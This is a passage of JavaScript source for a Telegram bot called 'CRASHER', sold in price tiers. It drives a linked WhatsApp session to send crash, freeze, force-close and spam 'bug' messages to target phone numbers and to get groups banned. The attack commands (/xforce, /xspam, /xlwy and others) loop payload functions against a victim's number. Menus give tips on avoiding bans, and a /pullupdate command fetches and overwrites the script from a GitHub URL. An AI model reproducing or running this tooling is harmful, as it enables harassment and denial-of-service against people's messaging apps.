  fs.writeFileSync(DB_FILE, JSON.stringify(db, null, 2));
}

let db = loadDB();

function extractCommand(text) {
  if (!text || !text.startsWith("/")) return null;
  let cmd = text.split(" ")[0].replace("/", "").toLowerCase();
  if (cmd.includes("@")) cmd = cmd.split("@")[0];
  cmd = cmd.replace(/[^a-zA-Z0-9_]/g, "");
  return cmd;
}

bot.command("offcmd", async (ctx) => {
  let args = ctx.message.text.trim().split(/\s+/);
  if (!args[1]) return ctx.reply("🪧 Example : /offcmd menu Atau /offcmd /menu");

  let cmd = args[1].toLowerCase().replace("/", "").replace("@", "").replace(/[^a-zA-Z0-9_]/g, "");
  if (db.disabled.includes(cmd)) return ctx.reply("udah OFF");

  db.disabled.push(cmd);
  saveDB(db);
  return ctx.reply("/" + cmd + " ⚠️ Berhasil di nonaktifkan dan user tidak bisa memakainya lagi");
});

bot.command("oncmd", async (ctx) => {
  let args = ctx.message.text.trim().split(/\s+/);
  if (!args[1]) return ctx.reply("🪧 Example : /oncmd menu Atau /oncmd /menu");
  
  let cmd = args[1].toLowerCase().replace("/", "").replace("@", "").replace(/[^a-zA-Z0-9_]/g, "");
  let index = db.disabled.indexOf(cmd);
  if (index === -1) return ctx.reply("Sudah aktif dongo");

  db.disabled.splice(index, 1);
  saveDB(db);
  return ctx.reply("/" + cmd + " Berhasil di aktifkan kembali 💎");
});

bot.command("offcmdlist", async (ctx) => {
  if (db.disabled.length === 0) return ctx.reply("semua command aktif");

  let list = "";
  for (let i = 0; i < db.disabled.length; i++) {
    list += (i + 1) + ". /" + db.disabled[i] + "\n";
  }
  return ctx.reply("⚠️ DAFTAR CMD YANG DI NONAKTIF OLEH OWNER:\n" + list);
});

bot.command("lockallcmd", async (ctx) => {
  if (db.lockAllCmd) return ctx.reply("udah ke-lock");
  db.lockAllCmd = true;
  saveDB(db);
  return ctx.reply("❌ Semua command yang ada pada script berhasil di Nonaktifkan semua secara Otomatis");
});

bot.command("unlockallcmd", async (ctx) => {
  if (!db.lockAllCmd) return ctx.reply("udah kebuka");
  db.lockAllCmd = false;
  saveDB(db);
  return ctx.reply("Selamat !!! Semua command telah di aktifkan dan di buka secara luas kembali !");
});

bot.use(async (ctx, next) => {
  if (!ctx.message?.text) return next();
  let cmd = extractCommand(ctx.message.text);
  if (!cmd) return next();

  if (cmd === "lockallcmd" || cmd === "unlockallcmd" || cmd === "offcmd" || cmd === "oncmd" || cmd === "offcmdlist") return next();

  if (db.lockAllCmd) return ctx.reply("🔒 Semua command telah di nonaktifkan semua oleh Owner, Hubungi mereka untuk membuka kembali");
  return next();
});

bot.use(async (ctx, next) => {
  if (!ctx.message?.text) return next();
  let cmd = extractCommand(ctx.message.text);
  if (!cmd) return next();

  if (db.disabled.includes(cmd)) return ctx.reply("⛔ /" + cmd + " ⚠️ Command ini sedang di nonaktifkan oleh Owner, Silahkan hubungi mereka agar di Aktifkan kembali !!!");
  return next();
});

bot.command("pullupdate", async (ctx) => {
    const GITHUB_RAW = "https://raw.githubusercontent.com/Xcrasher-real/mrkl/refs/heads/main/Crasher.js";
    const FILE_NAME  = "Crasher.js";
    const LOCAL_PATH = `./${FILE_NAME}`;

    const loadingMsg = await ctx.reply(
`⚙️ <b>AUTO UPDATE SCRIPT</b>
━━━━━━━━━━━━━━━━━━━━
🔄 <code>[░░░░░░░░░░]</code> 0%
⏳ Memulai proses update...
📑 File: <code>${FILE_NAME}</code>`,
        { parse_mode: "HTML" }
    );

    const editProgress = (bar, percent, statusLine) => {
        return ctx.telegram.editMessageText(
            loadingMsg.chat.id,
            loadingMsg.message_id,
            undefined,
`⚙️ <b>AUTO UPDATE SCRIPT</b>
━━━━━━━━━━━━━━━━━━━━
🔄 <code>[${bar}]</code> ${percent}%
${statusLine}
📑 File: <code>${FILE_NAME}</code>`,
            { parse_mode: "HTML" }
        ).catch(() => {});
    };

    const makeBar = (percent, size = 10) => {
        const filled = Math.round((percent / 100) * size);
        return "█".repeat(filled) + "░".repeat(size - filled);
    };

    try {
        await new Promise((resolve, reject) => {
            https.get(GITHUB_RAW, (res) => {
                if (res.statusCode !== 200) {
                    reject(new Error(`HTTP ${res.statusCode}`));
                    return;
                }

                const totalSize = parseInt(res.headers["content-length"], 10) || 0;
                let downloaded = 0;
                let lastUpdate = 0;

                const tmpPath = `${LOCAL_PATH}.tmp`;
                const fileStream = fs.createWriteStream(tmpPath);

                res.on("data", (chunk) => {
                    downloaded += chunk.length;
                    const now = Date.now();

                    if (totalSize > 0 && now - lastUpdate > 700) {
                        lastUpdate = now;
                        const percent = Math.floor((downloaded / totalSize) * 100);
                        const bar = makeBar(percent);
                        const kb = (downloaded / 1024).toFixed(1);
                        const totalKb = (totalSize / 1024).toFixed(1);

                        editProgress(
                            bar,
                            percent,
`⬇️ <i>Mengunduh... ${kb} KB / ${totalKb} KB</i>`
                        );
                    }
                });

                res.pipe(fileStream);

                fileStream.on("finish", () => {
                    fileStream.close(() => {
                        // rename .tmp → final (atomik, biar file lama nggak rusak kalau download gagal)
                        try {
                            if (fs.existsSync(LOCAL_PATH)) fs.unlinkSync(LOCAL_PATH);
                            fs.renameSync(tmpPath, LOCAL_PATH);
                            resolve();
                        } catch (e) {
                            reject(e);
                        }
                    });
                });

                fileStream.on("error", (err) => {
                    try { fs.unlinkSync(tmpPath); } catch {}
                    reject(err);
                });
            }).on("error", reject);
        });

        await editProgress(
            makeBar(100),
            100,
`🔍 <i>Memverifikasi file hasil unduhan...</i>`
        );

        const stat = fs.statSync(LOCAL_PATH);
        if (stat.size < 1024) {
            throw new Error(`File terlalu kecil (${stat.size} bytes), kemungkinan unduhan rusak`);
        }

        await ctx.telegram.editMessageText(
            loadingMsg.chat.id,
            loadingMsg.message_id,
            undefined,
`✅ <b>UPDATE FILE COMPLETE!</b>
━━━━━━━━━━━━━━━━━━━━
📑 File    : <code>${FILE_NAME}</code>
📦 Size    : ${(stat.size / 1024).toFixed(1)} KB
♻️ Status  : <i>Auto Restarting Panel...</i>`,
            { parse_mode: "HTML" }
        );

        setTimeout(() => process.exit(0), 1500);

    } catch (e) {
        await ctx.telegram.editMessageText(
            loadingMsg.chat.id,
            loadingMsg.message_id,
            undefined,
`❌ <b>UPDATE FAILED!</b>
━━━━━━━━━━━━━━━━━━━━
📑 File  : <code>${FILE_NAME}</code>
⚠️ Error : <code>${e.message}</code>`,
            { parse_mode: "HTML" }
        ).catch(() => {});
    }
});


bot.command('addprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 3) {
        return ctx.reply("🪧 ☇ Format: /addprem 12345678 30d");
    }
    const userId = args[1];
    const duration = parseInt(args[2]);
    if (isNaN(duration)) {
        return ctx.reply("🪧 ☇ Durasi harus berupa angka dalam hari");
    }
    const expiryDate = addpremUser(userId, duration);
    ctx.reply(`✅ ☇ ${userId} berhasil ditambahkan sebagai pengguna premium sampai ${expiryDate}`);
});

bot.command('delprem', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delprem 12345678");
    }
    const userId = args[1];
    removePremiumUser(userId);
        ctx.reply(`✅ ☇ ${userId} telah berhasil dihapus dari daftar pengguna premium`);
});

const PREM_GROUP_FILE = "./grup.json";

// Auto create file grup.json kalau belum ada
function ensurePremGroupFile() {
  if (!fs.existsSync(PREM_GROUP_FILE)) {
    fs.writeFileSync(PREM_GROUP_FILE, JSON.stringify([], null, 2));
  }
}

function loadPremGroups() {
  ensurePremGroupFile();
  try {
    const raw = fs.readFileSync(PREM_GROUP_FILE, "utf8");
    const data = JSON.parse(raw);
    return Array.isArray(data) ? data.map(String) : [];
  } catch {
    // kalau corrupt, reset biar aman
    fs.writeFileSync(PREM_GROUP_FILE, JSON.stringify([], null, 2));
    return [];
  }
}

function savePremGroups(groups) {
  ensurePremGroupFile();
  const unique = [...new Set(groups.map(String))];
  fs.writeFileSync(PREM_GROUP_FILE, JSON.stringify(unique, null, 2));
}

function isPremGroup(chatId) {
  const groups = loadPremGroups();
  return groups.includes(String(chatId));
}

function addPremGroup(chatId) {
  const groups = loadPremGroups();
  const id = String(chatId);
  if (groups.includes(id)) return false;
  groups.push(id);
  savePremGroups(groups);
  return true;
}

function delPremGroup(chatId) {
  const groups = loadPremGroups();
  const id = String(chatId);
  if (!groups.includes(id)) return false;
  const next = groups.filter((x) => x !== id);
  savePremGroups(next);
  return true;
}

bot.command('addpremgrup', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const groupId = ctx.chat.id; // otomatis ambil ID grup
    const duration = 30; // default 30 hari (ubah sesuai kebutuhan)

    const premiumUsers = loadPremGroups();
    const expiryDate = moment()
        .add(duration, 'days')
        .tz('Asia/Jakarta')
        .format('DD-MM-YYYY');

    premiumUsers[groupId] = expiryDate;
    addPremGroup(groupId);

    ctx.reply(`🎉 Pengguna ${groupId} berhasil ditambahkan ke daftar premium.`);
});

bot.command('delpremgrup', async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }

    const groupId = ctx.chat.id; // otomatis ambil ID grup
    const premiumUsers = loadPremiumUsers();

    if (premiumUsers[groupId]) {
        delete premiumUsers[groupId];
        savePremiumUsers(premiumUsers);
        ctx.reply(`✅ ☇ Grup ini berhasil dihapus dari daftar premium`);
    } else {
        ctx.reply(`🪧 ☇ Grup ini tidak ada dalam daftar premium`);
    }
});

bot.start(async (ctx) => {
    const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
    const senderStatus = isWhatsAppConnected ? "✅ Terhubung" : "❌ Tidak Terhubung";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();

    const menuMessage = `
<blockquote><b>𝐂𝐑𝐀𝐒𝐇𝐄𝐑</b></blockquote>
<blockquote><tg-emoji emoji-id="5897824076977671910">🌈</tg-emoji> Developer : @kaastr26
<tg-emoji emoji-id="6030617915944866144">🍭</tg-emoji> Version : 1.0 
<tg-emoji emoji-id="5898010577342566029">🍃</tg-emoji> Platform : Telegram
<tg-emoji emoji-id="6030880810893053589">📍</tg-emoji> Type Script : Spam</blockquote>
<blockquote>｟ 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 ｠
<tg-emoji emoji-id="6267172559851099903">📌</tg-emoji> ID : ${ctx.from.id}
<tg-emoji emoji-id="6267172559851099903">📌</tg-emoji> Username : @${ctx.from.username || "Tidak ada username"}
<tg-emoji emoji-id="6267256822814480365">❗️</tg-emoji> Koneksi : ${senderStatus}</blockquote>
<blockquote><b>𝐍𝐄𝐖 𝐔𝐏𝐃𝐀𝐓𝐄 𝐎𝐊𝐓𝐎𝐁𝐄𝐑 <tg-emoji emoji-id="6028477720856367105">👻</tg-emoji></b></blockquote>`;   
    
    const keyboard = [
        [
            {
                text: "ᴘʀɪᴄᴇ sᴄʀɪᴘᴛ",
                callback_data: "/price",
                style : "primary",
                icon_custom_emoji_id: "6028195661764103744",
            },
        ],
        [
            {
                text: "ʙᴜɢs",
                callback_data: "/bug",
                style : "danger",
                icon_custom_emoji_id: "5897659291967426441",
            },
            {
                text: "sᴇᴛᴛɪɴɢs",
                callback_data: "/controls",
                style : "success",
                icon_custom_emoji_id: "6028551194861899805",
            },
        ],
        [
            {
                text: "ᴛᴏᴏʟs",
                callback_data: "/tools",
                style : "primary",
                icon_custom_emoji_id: "6028168942772556143",
            },
            {
                text: "ᴛǫ ᴛᴏ",
                callback_data: "/support",
                style : "danger",
                icon_custom_emoji_id: "6267149259653518704",
            },
        ],
        [
            {
                text: "ᴅᴇᴠᴇʟᴏᴘᴇʀ", 
                url: "https://t.me/kaastr26",
                style : "success",
                icon_custom_emoji_id: "5443038326535759644", 
            },
            {
                text: "ᴄʜᴀɴɴᴇʟ", 
                url: "https://t.me/crasherinfo",
                style : "primary",
                icon_custom_emoji_id: "5780405967527089720", 
            },
        ]
    ];

    return ctx.replyWithPhoto(thumbnailUrl, {
        caption: menuMessage,
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: keyboard
        }
    });
});

bot.action("/start", async (ctx) => {
    const senderStatus = isWhatsAppConnected ? "✅ Terhubung" : "❌ Tidak Terhubung";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();
    
    // Ambil id dan username dari ctx
    const userId = ctx.from.id;
    const username = ctx.from.username || "Tidak ada username";
  
    const menuMessage = `
<blockquote><b>𝐂𝐑𝐀𝐒𝐇𝐄𝐑</b></blockquote>
<blockquote><tg-emoji emoji-id="5897824076977671910">🌈</tg-emoji> Developer : @kaastr26
<tg-emoji emoji-id="6030617915944866144">🍭</tg-emoji> Version : 1.0 
<tg-emoji emoji-id="5898010577342566029">🍃</tg-emoji> Platform : Telegram
<tg-emoji emoji-id="6030880810893053589">📍</tg-emoji> Type Script : Spam</blockquote>
<blockquote>｟ 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 ｠
<tg-emoji emoji-id="6267172559851099903">📌</tg-emoji> ID : ${ctx.from.id}
<tg-emoji emoji-id="6267172559851099903">📌</tg-emoji> Username : @${ctx.from.username || "Tidak ada username"}
<tg-emoji emoji-id="6267256822814480365">❗️</tg-emoji> Koneksi : ${senderStatus}</blockquote>
<blockquote><b>𝐍𝐄𝐖 𝐔𝐏𝐃𝐀𝐓𝐄 <tg-emoji emoji-id="6028477720856367105">👻</tg-emoji></b></blockquote>`;
        
    const keyboard = [
        [
            {
                text: "ᴘʀɪᴄᴇ sᴄʀɪᴘᴛ",
                callback_data: "/price",
                style : "primary",
                icon_custom_emoji_id: "6028195661764103744",
            },
        ],
        [
            {
                text: "ʙᴜɢs",
                callback_data: "/bug",
                style : "danger",
                icon_custom_emoji_id: "5897659291967426441",
            },
            {
                text: "sᴇᴛᴛɪɴɢs",
                callback_data: "/controls",
                style : "success",
                icon_custom_emoji_id: "6028551194861899805",
            },
        ],
        [
            {
                text: "ᴛᴏᴏʟs",
                callback_data: "/tools",
                style : "primary",
                icon_custom_emoji_id: "6028168942772556143",
            },
            {
                text: "ᴛǫ ᴛᴏ",
                callback_data: "/support",
                style : "danger",
                icon_custom_emoji_id: "6267149259653518704",
            },
        ],
        [
            {
                text: "ᴅᴇᴠᴇʟᴏᴘᴇʀ", 
                url: "https://t.me/kaastr26",
                style : "success",
                icon_custom_emoji_id: "5443038326535759644", 
            },
            {
                text: "ᴄʜᴀɴɴᴇʟ", 
                url: "https://t.me/crasherinfo",
                style : "primary",
                icon_custom_emoji_id: "5780405967527089720", 
            },
        ]
    ];
    
    try {
        await ctx.editMessageMedia({
            type: "photo",
            media: thumbnailUrl,
            caption: menuMessage,
            parse_mode: "HTML",
        }, {
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
            console.error("Error in /start action:", error);
        }
    }
});

bot.action("/tools", async (ctx) => {
    const senderStatus = isWhatsAppConnected ? "✅ Terhubung" : "❌ Tidak Terhubung";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();

    const bugMenu = `
<blockquote><b>𝐂𝐑𝐀𝐒𝐇𝐄𝐑</b></blockquote>
<blockquote><tg-emoji emoji-id="5897824076977671910">🌈</tg-emoji> Developer : @kaastr26
<tg-emoji emoji-id="6030617915944866144">🍭</tg-emoji> Version : 1.0 
<tg-emoji emoji-id="5898010577342566029">🍃</tg-emoji> Platform : Telegram
<tg-emoji emoji-id="6030880810893053589">📍</tg-emoji> Type Script : Spam</blockquote>
<blockquote>｟ 𝐓𝐎𝐎𝐋𝐒 𝐌𝐄𝐍𝐔 ｠
♧ /tiktokdl - Download Video TikTok
♧ /igdl - Dwonload Video Instagram
♧ /spotify - Cari Lagu Via Spotify</blockquote>
<blockquote><b>𝐍𝐄𝐖 𝐔𝐏𝐃𝐀𝐓𝐄 𝐒𝐄𝐏𝐓𝐄𝐌𝐁𝐄𝐑 <tg-emoji emoji-id="6028477720856367105">👻</tg-emoji></b></blockquote>
`;

    const keyboard = [
        [
            {
                text: "ʙᴀᴄᴋ",
                callback_data: "/start",
                style: "danger",
                icon_custom_emoji_id: "5416041192905265756",
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(bugMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
            console.error("Error in /tools action:", error);
        }
    }
});

bot.action("/qoutes", async (ctx) => {
    const senderStatus = isWhatsAppConnected ? "✅ Terhubung" : "❌ Tidak Terhubung";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();

    const bugMenu = `
<blockquote><b>𝐂𝐑𝐀𝐒𝐇𝐄𝐑</b></blockquote>
<blockquote><tg-emoji emoji-id="5897824076977671910">🌈</tg-emoji> Developer : @kaastr26
<tg-emoji emoji-id="6030617915944866144">🍭</tg-emoji> Version : 1.0 
<tg-emoji emoji-id="5898010577342566029">🍃</tg-emoji> Platform : Telegram
<tg-emoji emoji-id="6030880810893053589">📍</tg-emoji> Type Script : Spam</blockquote>
<blockquote>｟ 𝐏𝐄𝐍𝐉𝐄𝐋𝐀𝐒𝐀𝐍 𝐌𝐄𝐍𝐔 ｠
<tg-emoji emoji-id="5463346198926612431">🖤</tg-emoji> Nokos Old Jamin Aman 100%
<tg-emoji emoji-id="5463346198926612431">🖤</tg-emoji> Nokos Fresh Wajib Save 75%
<tg-emoji emoji-id="5463346198926612431">🖤</tg-emoji> Nokos Old Bebas Spam All Command Bugs
<tg-emoji emoji-id="5463346198926612431">🖤</tg-emoji> Nokos Fresh Jeda Command Minimal 30-45 Detik
<tg-emoji emoji-id="5463346198926612431">🖤</tg-emoji> Jika Tidak Bisa Melakukan Pairing Berarti Sender Kalian Mengalami Ban Pairing
<tg-emoji emoji-id="5463346198926612431">🖤</tg-emoji> Jika Bugs Tidak Work Kemungkinan Sender Kalian Mengalami Soft Banned</blockquote>
<blockquote><b>𝐍𝐄𝐖 𝐔𝐏𝐃𝐀𝐓𝐄 𝐒𝐄𝐏𝐓𝐄𝐌𝐁𝐄𝐑 <tg-emoji emoji-id="6028477720856367105">👻</tg-emoji></b></blockquote>
`;

    const keyboard = [
        [
            {
                text: "ʙᴜɢs",
                callback_data: "/bug",
                style: "success",
                icon_custom_emoji_id: "5897659291967426441",
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(bugMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
            console.error("Error in /qoutes action:", error);
        }
    }
});

bot.action("/support", async (ctx) => {
    const senderStatus = isWhatsAppConnected ? "✅ Terhubung" : "❌ Tidak Terhubung";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();

    const bugMenu = `
<blockquote><b>𝐂𝐑𝐀𝐒𝐇𝐄𝐑</b></blockquote>
<blockquote><tg-emoji emoji-id="5897824076977671910">🌈</tg-emoji> Developer : @kaastr26
<tg-emoji emoji-id="6030617915944866144">🍭</tg-emoji> Version : 1.0 
<tg-emoji emoji-id="5898010577342566029">🍃</tg-emoji> Platform : Telegram
<tg-emoji emoji-id="6030880810893053589">📍</tg-emoji> Type Script : Spam</blockquote>
<blockquote>｟ 𝐓𝐐 𝐓𝐎 𝐌𝐄𝐍𝐔 ｠
𖤥 @allmember
  ➥ Best Support
𖤥 @OZIGGNIBOS
  ➥ Best Friend
𖤥 @zero Dev app
  ➥ Best Friend
𖤥 @siapa lgi?
  ➥ Sesepuh</blockquote>
<blockquote><b>𝐍𝐄𝐖 𝐔𝐏𝐃𝐀𝐓𝐄 𝐎𝐊𝐓𝐎𝐁𝐄𝐑 <tg-emoji emoji-id="6028477720856367105">👻</tg-emoji></b></blockquote>
`;

    const keyboard = [
        [
            {
                text: "ʙᴀᴄᴋ",
                callback_data: "/start",
                style: "danger",
                icon_custom_emoji_id: "5416041192905265756",
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(bugMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
            console.error("Error in /support action:", error);
        }
    }
});

bot.action("/price", async (ctx) => {
    const senderStatus = isWhatsAppConnected ? "✅ Terhubung" : "❌ Tidak Terhubung";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();

    const bugMenu = `
<blockquote><b>𝐂𝐑𝐀𝐒𝐇𝐄𝐑</b></blockquote>
<blockquote><tg-emoji emoji-id="5897824076977671910">🌈</tg-emoji> Developer : @kaastr26
<tg-emoji emoji-id="6030617915944866144">🍭</tg-emoji> Version : 1.0 
<tg-emoji emoji-id="5898010577342566029">🍃</tg-emoji> Platform : Telegram
<tg-emoji emoji-id="6030880810893053589">📍</tg-emoji> Type Script : Spam</blockquote>
<blockquote>｟ 𝐇𝐀𝐑𝐆𝐀 𝐌𝐄𝐍𝐔 ｠
༈ Full Update - 1.000
༈ Reseller - 3.000
༈ Partner - 5.000
༈ Moderator - 8.000
༈ Ceo - 10.000
༈ Owner - 15.000
༈ Creator - 25.000</blockquote>
<blockquote><b>𝐍𝐄𝐖 𝐔𝐏𝐃𝐀𝐓𝐄 𝐎𝐊𝐓𝐎𝐁𝐄𝐑 <tg-emoji emoji-id="6028477720856367105">👻</tg-emoji></b></blockquote>
`;

    const keyboard = [
        [
            {
                text: "ʙᴀᴄᴋ",
                callback_data: "/start",
                style: "danger",
                icon_custom_emoji_id: "5416041192905265756",
            }
        ], 
        [
            {
                text: "ʙᴜʏ sᴄʀɪᴘᴛ",
                url: "https://t.me/kaastr26",
                style: "primary",
                icon_custom_emoji_id: "6028497653799588476",
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(bugMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
            console.error("Error in /price action:", error);
        }
    }
});

bot.action("/controls", async (ctx) => {
    const senderStatus = isWhatsAppConnected ? "✅ Terhubung" : "❌ Tidak Terhubung";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();
    
    const controlsMenu = `
<blockquote><b>𝐂𝐑𝐀𝐒𝐇𝐄𝐑</b></blockquote>
<blockquote><tg-emoji emoji-id="5897824076977671910">🌈</tg-emoji> Developer : @kaastr26
<tg-emoji emoji-id="6030617915944866144">🍭</tg-emoji> Version : 1.0 
<tg-emoji emoji-id="5898010577342566029">🍃</tg-emoji> Platform : Telegram
<tg-emoji emoji-id="6030880810893053589">📍</tg-emoji> Type Script : Spam</blockquote>
<blockquote>｟ 𝐁𝐎𝐓 𝐌𝐄𝐍𝐔 ｠
↯ /addsender - Menambahkan Session
↯ /resetsession - Menghapus Session
↯ /setcd - Memberikan Jeda</blockquote>
<blockquote>｟ 𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔 ｠
↯ /pullupdate - Auto Update Sc
↯ /oncmd - aktifkan cmd
↯ /offcmd - nonaktifkan cmd
↯ /offcmdlist - lihat ada berapa cmd yang di nonaktfikan
↯ /addadmin - Menambahkan Admin
↯ /deladmin - Menghapus Admin
↯ /testfunction - Test Function</blockquote>
<blockquote>｟ 𝐔𝐒𝐄𝐑 𝐌𝐄𝐍𝐔 ｠
↯ /addprem - Menambahkan Premium
↯ /delprem - Menghapus Premium</blockquote>
<blockquote>｟ 𝐆𝐑𝐎𝐔𝐏 𝐌𝐄𝐍𝐔 ｠
↯ /addpremgrup - Menambahkan Akses Group Premium
↯ /delpremgrup - Menghapuskan Akses Group Premium</blockquote>
<blockquote><b>𝐍𝐄𝐖 𝐔𝐏𝐃𝐀𝐓𝐄 𝐎𝐊𝐓𝐎𝐁𝐄𝐑 <tg-emoji emoji-id="6028477720856367105">👻</tg-emoji></b></blockquote>
`;
      
    const keyboard = [
        [
            {
                text: "ʙᴀᴄᴋ",
                callback_data: "/start",
                style: "danger",
                icon_custom_emoji_id: "5416041192905265756",
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(controlsMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
            console.error("Error in /controls action:", error);
        }
    }
});

bot.action("/bug", async (ctx) => {
    const senderStatus = isWhatsAppConnected ? "✅ Terhubung" : "❌ Tidak Terhubung";
    const runtimeStatus = formatRuntime();
    const memoryStatus = formatMemory();
    const cooldownStatus = loadCooldown();

    const bugMenu = `
<blockquote><b>𝐂𝐑𝐀𝐒𝐇𝐄𝐑</b></blockquote>
<blockquote><tg-emoji emoji-id="5897824076977671910">🌈</tg-emoji> Developer : @kaastr26
<tg-emoji emoji-id="6030617915944866144">🍭</tg-emoji> Version : 1.0 
<tg-emoji emoji-id="5898010577342566029">🍃</tg-emoji> Platform : Telegram
<tg-emoji emoji-id="6030880810893053589">📍</tg-emoji> Type Script : Spam</blockquote>
<blockquote>｟ 𝐁𝐔𝐆 𝐆𝐑𝐎𝐔𝐏 𝐌𝐄𝐍𝐔 ｠
⌬ /bannido - Banned Group</blockquote>
<blockquote>｟ 𝐁𝐔𝐆 𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 𝐌𝐄𝐍𝐔 ｠
⌬ /xsky  - Delay [ no spam ]
⌬ /xloly - Delay Hard [ no spam ]
⌬ /xlary - Freeze [ no spam ]
⌬ /xspam - spam pto [ bebas spam ]
⌬ /xzyc - lock chat [ bebas spam ]
⌬ /xforce - FC [ no spam ]
⌬ /xlwy - Blank [ no spam ]</blockquote>
<blockquote><b>𝐍𝐄𝐖 𝐔𝐏𝐃𝐀𝐓𝐄 <tg-emoji emoji-id="6028477720856367105">👻</tg-emoji></b></blockquote>
`;

    const keyboard = [
        [
            {
                text: "ᴘᴇɴᴊᴇʟᴀsᴀɴ",
                callback_data: "/qoutes",
                style: "success",
                icon_custom_emoji_id: "5465550745510105811",
            }
        ],
        [
            {
                text: "ʙᴀᴄᴋ",
                callback_data: "/start",
                style: "danger",
                icon_custom_emoji_id: "5416041192905265756",
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(bugMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
            console.error("Error in /bug action:", error);
        }
    }
});

bot.command("xforce", checkPremiumGrup, checkCooldown, checkWhatsAppConnection, async (ctx) => {

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("Contoh: /xforce 628xxxxxxxx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.reply(`
  ✅ xforce (bug) selesai untuk ${q}
  `);

  for (let i = 0; i < 5; i++) {
    await BlankDelayClick(sock, target);
    await sleep(2000);
  }

});

bot.command("xspam", checkPremiumGrup, checkCooldown, checkWhatsAppConnection, async (ctx) => {

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("Contoh: /xspam 628xxxxxxxx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.reply(`
  ✅ xforce (bug) selesai untuk ${q}
  `);

  for (let i = 0; i < 5; i++) {
    await BlankDelayClick(sock, target);
    await sleep(2000);
  }

});

bot.command("xlwy", checkPremiumGrup, checkCooldown, checkWhatsAppConnection, async (ctx) => {

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("Contoh: /xlwy 628xxxxxxxx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.reply(`
  ✅ xlwy (bug) selesai untuk ${q}
  `);

  for (let i = 0; i < 15; i++) {
    await NewFungsionOBX(sock, m, target);
    await sleep(1700);
  }

});

bot.command("xsky", checkPremiumGrup, checkCooldown, checkWhatsAppConnection, async (ctx) => {

  const q = ctx.message.text.split(" ")[1];
